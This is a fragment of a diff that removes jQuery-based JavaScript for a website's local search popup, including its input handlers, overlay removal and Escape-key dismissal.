-            input.addEventListener('input', inputEventFunction);
-          } else {
-            $('.search-icon').click(inputEventFunction);
-            input.addEventListener('keypress', function (event) {
-              if (event.keyCode === 13) {
-                inputEventFunction();
-              }
-            });
-          }
-
-          // remove loading animation
-          $(".local-search-pop-overlay").remove();
-          $('body').css('overflow', '');
-
-          proceedsearch();
-        }
-      });
-    }
-
-    // handle and trigger popup window;
-    $('.popup-trigger').click(function(e) {
-      e.stopPropagation();
-      if (isfetched === false) {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      } else {
-        proceedsearch();
-      };
-    });
-
-    $('.popup-btn-close').click(onPopupClose);
-    $('.popup').click(function(e){
-      e.stopPropagation();
-    });
-    $(document).on('keyup', function (event) {
-      var shouldDismissSearchPopup = event.which === 27 &&
-        $('.search-popup').is(':visible');
-      if (shouldDismissSearchPopup) {
-        onPopupClose();
-      }
-    });
-  </script>
 
 
 
